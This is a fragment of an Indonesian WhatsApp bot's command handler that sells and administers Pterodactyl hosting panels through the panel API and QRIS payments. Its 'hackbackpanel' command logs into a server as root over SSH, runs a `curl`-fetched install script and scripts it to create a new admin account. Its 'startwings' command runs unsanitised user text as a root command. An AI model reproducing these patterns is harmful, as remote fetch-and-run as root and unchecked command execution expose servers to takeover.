break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await FardanDev.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await FardanDev.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addprem": case "addpremium": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi premium!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah premium ✅`)
}
break

//================================================================================

case "listpremium": case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user premium")
let teks = `\n *#- List all user premium*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
FardanDev.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *#- List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://gateway.elevate.web.id/api/orkut/createpayment?amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await FardanDev.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await FardanDev.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await FardanDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://gateway.elevate.web.id/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await FardanDev.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await FardanDev.sendMessage(orang, {text: tekspanel}, {quoted: null})
await FardanDev.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await FardanDev.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await FardanDev.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
await m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await FardanDev.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await FardanDev.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await FardanDev.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await FardanDev.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

